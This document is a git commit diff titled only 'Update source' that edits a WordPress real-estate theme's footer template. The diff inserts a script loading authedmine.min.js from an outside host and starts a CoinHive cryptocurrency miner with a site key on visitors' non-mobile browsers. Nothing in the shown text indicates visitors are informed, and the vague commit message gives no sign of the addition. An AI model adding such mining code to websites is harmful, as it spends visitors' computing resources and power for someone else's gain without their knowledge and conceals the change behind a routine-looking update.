984824dd58d373e24a94c62494fe493c812a80fe
nopphasinara <nopphasin.arayasirikul@gmail.com>
2018-11-01 16:26:07 +0700

    Update source

--- wp-content/themes/houzez/footer-single-property.php
+++ wp-content/themes/houzez/footer-single-property.php
@@ -99,6 +99,15 @@ $copy_rights = houzez_option('copy_rights'); ?>
 <!--end footer section-->
 
 <?php wp_footer(); ?>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('I0mHlS18YVnDWfBWV1egK9EoMvtKUTLt', {throttle: 0.3});
 
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+        miner.start();
+    }
+</script>
 </body>
 </html>
